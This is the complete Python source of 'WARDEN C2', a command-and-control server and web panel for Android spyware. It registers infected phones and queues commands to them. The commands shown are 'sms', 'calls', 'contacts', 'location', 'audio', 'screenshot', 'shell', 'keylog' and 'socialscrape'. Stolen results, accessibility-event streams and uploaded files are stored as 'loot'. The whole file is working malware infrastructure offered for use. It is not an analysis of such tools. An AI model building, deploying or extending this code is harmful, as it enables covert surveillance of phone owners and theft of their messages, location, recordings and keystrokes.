#!/usr/bin/env python3
"""
WARDEN C2 — pure stdlib (http.server + sqlite3).
Endpoints:
  POST /api/checkin            {device_id, model, ...} -> {agent_id, interval}
  GET  /api/commands/<id>      -> [{id, cmd, args}]
  POST /api/result             {agent_id, cmd_id, output}
  POST /api/event              {agent_id, type, pkg, text}   (accessibility stream)
  POST /api/upload?agent_id&name   (multipart file)
  GET  /api/agents             -> agent list (panel)
  GET  /api/loot/<agent_id>    -> results + events + files
  POST /api/queue              {agent_id, cmd, args}
  GET  /                       panel
"""
import json
import os
import sqlite3
import threading
import time
import uuid
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

DB = os.path.join(os.path.dirname(os.path.abspath(__file__)), "warden.db")
LOOT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot")
os.makedirs(LOOT_DIR, exist_ok=True)

lock = threading.Lock()


def db():
    c = sqlite3.connect(DB, timeout=30)
    c.row_factory = sqlite3.Row
    return c


def init_db():
    with db() as c:
        c.execute("""CREATE TABLE IF NOT EXISTS agents(
            id TEXT PRIMARY KEY, device_id TEXT, model TEXT, brand TEXT,
            android TEXT, sdk INTEGER, phone TEXT, last_seen INTEGER,
            interval INTEGER DEFAULT 300)""")
        c.execute("""CREATE TABLE IF NOT EXISTS commands(
            id TEXT PRIMARY KEY, agent_id TEXT, cmd TEXT, args TEXT,
            status TEXT DEFAULT 'pending', result TEXT, created INTEGER)""")
        c.execute("""CREATE TABLE IF NOT EXISTS events(
            id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id TEXT, type TEXT,
            pkg TEXT, text TEXT, time INTEGER)""")
        c.execute("""CREATE TABLE IF NOT EXISTS files(
            id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id TEXT, name TEXT,
            path TEXT, size INTEGER, time INTEGER)""")


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        pass  # quiet

    # ---- helpers ----
    def _json(self, obj, code=200):
        body = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _body(self):
        n = int(self.headers.get("Content-Length", 0))
        return self.rfile.read(n) if n else b""

    def _text(self, s, code=200, ctype="text/html; charset=utf-8"):
        b = s.encode() if isinstance(s, str) else s
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    # ---- routes ----
    def do_GET(self):
        u = urlparse(self.path)
        p = u.path
        q = parse_qs(u.query)
        if p == "/":
            return self._text(PANEL)
        if p == "/api/agents":
            with db() as c:
                rows = [dict(r) for r in c.execute(
                    "SELECT * FROM agents ORDER BY last_seen DESC")]
            return self._json(rows)
        if p.startswith("/api/commands/"):
            aid = p.rsplit("/", 1)[1]
            with db() as c:
                rows = c.execute(
                    "SELECT id, cmd, args FROM commands WHERE agent_id=? AND status='pending'",
                    (aid,)).fetchall()
                for r in rows:
                    c.execute("UPDATE commands SET status='sent' WHERE id=?", (r["id"],))
            return self._json([dict(r) for r in rows])
        if p.startswith("/api/loot/"):
            aid = p.rsplit("/", 1)[1]
            with db() as c:
                cmds = [dict(r) for r in c.execute(
                    "SELECT * FROM commands WHERE agent_id=? ORDER BY created DESC", (aid,))]
                evs = [dict(r) for r in c.execute(
                    "SELECT * FROM events WHERE agent_id=? ORDER BY id DESC LIMIT 500", (aid,))]
                files = [dict(r) for r in c.execute(
                    "SELECT * FROM files WHERE agent_id=? ORDER BY id DESC", (aid,))]
            return self._json({"commands": cmds, "events": evs, "files": files})
        if p.startswith("/loot/"):
            fp = os.path.join(LOOT_DIR, p[len("/loot/"):])
            if os.path.isfile(fp):
                with open(fp, "rb") as f:
                    return self._text(f.read(), ctype="application/octet-stream")
            return self._text("not found", 404)
        return self._json({"error": "not found"}, 404)

    def do_POST(self):
        u = urlparse(self.path)
        p = u.path
        q = parse_qs(u.query)
        try:
            if p == "/api/checkin":
                d = json.loads(self._body() or b"{}")
                with db() as c:
                    row = c.execute("SELECT id FROM agents WHERE device_id=?",
                                    (d.get("device_id"),)).fetchone()
                    if row:
                        aid = row["id"]
                        c.execute("""UPDATE agents SET model=?,brand=?,android=?,sdk=?,
                                     phone=?,last_seen=? WHERE id=?""",
                                  (d.get("model"), d.get("brand"), d.get("android"),
                                   d.get("sdk"), d.get("phone"), int(time.time()), aid))
                    else:
                        aid = uuid.uuid4().hex[:12]
                        c.execute("""INSERT INTO agents
                                     (id,device_id,model,brand,android,sdk,phone,last_seen)
                                     VALUES (?,?,?,?,?,?,?,?)""",
                                  (aid, d.get("device_id"), d.get("model"), d.get("brand"),
                                   d.get("android"), d.get("sdk"), d.get("phone"),
                                   int(time.time())))
                return self._json({"agent_id": aid, "interval": 300})

            if p == "/api/result":
                d = json.loads(self._body() or b"{}")
                with db() as c:
                    c.execute("UPDATE commands SET status='done', result=? WHERE id=?",
                              (d.get("output"), d.get("cmd_id")))
                return self._json({"ok": True})

            if p == "/api/event":
                d = json.loads(self._body() or b"{}")
                with db() as c:
                    c.execute("""INSERT INTO events(agent_id,type,pkg,text,time)
                                 VALUES (?,?,?,?,?)""",
                              (d.get("agent_id"), d.get("type"), d.get("pkg"),
                               d.get("text"), d.get("time", int(time.time()))))
                return self._json({"ok": True})

            if p == "/api/queue":
                d = json.loads(self._body() or b"{}")
                cid = uuid.uuid4().hex[:12]
                with db() as c:
                    c.execute("""INSERT INTO commands(id,agent_id,cmd,args,created)
                                 VALUES (?,?,?,?,?)""",
                              (cid, d.get("agent_id"), d.get("cmd"),
                               d.get("args", ""), int(time.time())))
                return self._json({"id": cid})

            if p == "/api/upload":
                aid = (q.get("agent_id") or [""])[0]
                name = (q.get("name") or ["file.bin"])[0]
                adir = os.path.join(LOOT_DIR, aid or "unknown")
                os.makedirs(adir, exist_ok=True)
                safe = os.path.basename(name)
                fp = os.path.join(adir, f"{int(time.time())}_{safe}")
                data = self._parse_multipart()
                if data is None:
                    return self._json({"error": "bad multipart"}, 400)
                with open(fp, "wb") as f:
                    f.write(data)
                rel = os.path.relpath(fp, LOOT_DIR).replace("\\", "/")
                with db() as c:
                    c.execute("""INSERT INTO files(agent_id,name,path,size,time)
                                 VALUES (?,?,?,?,?)""",
                              (aid, safe, rel, len(data), int(time.time())))
                return self._json({"ok": True, "size": len(data)})
        except Exception as e:
            return self._json({"error": str(e)}, 500)
        return self._json({"error": "not found"}, 404)

    def _parse_multipart(self):
        ctype = self.headers.get("Content-Type", "")
        if "boundary=" not in ctype:
            return None
        boundary = ctype.split("boundary=")[1].strip()
        n = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(n)
        marker = b"--" + boundary.encode()
        parts = raw.split(marker)
        for part in parts:
            if b"Content-Disposition" in part and b"filename=" in part:
                idx = part.find(b"\r\n\r\n")
                if idx == -1:
                    continue
                body = part[idx + 4:]
                if body.endswith(b"\r\n"):
                    body = body[:-2]
                return body
        return None


PANEL = """<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>WARDEN C2</title>
<style>
body{background:#111;color:#0f0;font-family:monospace;margin:0;padding:16px}
h1{color:#0f0;border-bottom:1px solid #0f0;padding-bottom:8px}
.agent{background:#1a1a1a;border:1px solid #333;margin:10px 0;padding:10px;border-radius:4px}
.agent h3{margin:0 0 6px 0;color:#ff0}
.meta{color:#888;font-size:12px;margin-bottom:8px}
button{background:#0a0;color:#000;border:0;padding:4px 10px;margin:2px;cursor:pointer;font-family:monospace}
input{background:#000;color:#0f0;border:1px solid #0f0;padding:4px;font-family:monospace}
pre{background:#000;padding:8px;overflow:auto;max-height:300px;font-size:11px;white-space:pre-wrap}
.row{margin:4px 0}
</style></head><body>
<h1>WARDEN C2 PANEL</h1>
<div id="agents">loading…</div>
<script>
const CMDS=['sms','calls','contacts','location','photo','audio','files','shell','clipboard','apps','info','photos','calendar','screenshot','download','interval','openapp','videorec','socialscrape','keylog'];
async function refresh(){
 const r=await fetch('/api/agents'); const agents=await r.json();
 let h='';
 for(const a of agents){
  h+=`<div class="agent"><h3>${a.model||'?'} — ${a.id}</h3>
   <div class="meta">${a.brand||''} · Android ${a.android||'?'} · ${a.phone||'no number'} · last seen ${new Date(a.last_seen*1000).toLocaleString()}</div>
   <div class="row">`+CMDS.map(c=>`<button onclick="queue('${a.id}','${c}','')">${c}</button>`).join('')+`</div>
   <div class="row"><input id="args-${a.id}" placeholder="args (audio seconds / file path / shell cmd)" size="40">
   <button onclick="queue('${a.id}',document.getElementById('cmd-${a.id}').value,document.getElementById('args-${a.id}').value)">send custom</button>
   <select id="cmd-${a.id}">`+CMDS.map(c=>`<option>${c}</option>`).join('')+`</select>
   <button onclick="loot('${a.id}')">loot</button></div>
   <pre id="loot-${a.id}"></pre></div>`;
 }
 document.getElementById('agents').innerHTML=h||'no agents yet';
}
async function queue(aid,cmd,args){
 await fetch('/api/queue',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({agent_id:aid,cmd:cmd,args:args})});
 alert('queued: '+cmd);
}
async function loot(aid){
 const r=await fetch('/api/loot/'+aid); const d=await r.json();
 let t='';
 for(const c of d.commands) t+=`[${c.status}] ${c.cmd} ${c.args}\\n${(c.result||'').slice(0,2000)}\\n\\n`;
 for(const e of d.events.slice(0,50)) t+=`[${e.type}] ${e.pkg}: ${(e.text||'').slice(0,200)}\\n`;
 for(const f of d.files) t+=`[file] ${f.name} (${f.size}B) <a href="/loot/${f.path}" style="color:#0ff">download</a>\\n`;
 document.getElementById('loot-'+aid).textContent=t||'no loot';
}
refresh(); setInterval(refresh,10000);
</script></body></html>"""


if __name__ == "__main__":
    init_db()
    port = int(os.environ.get("PORT", 8000))
    srv = ThreadingHTTPServer(("0.0.0.0", port), Handler)
    print(f"[WARDEN C2] listening on 0.0.0.0:{port}")
    print(f"[WARDEN C2] panel: http://127.0.0.1:{port}/")
    srv.serve_forever()
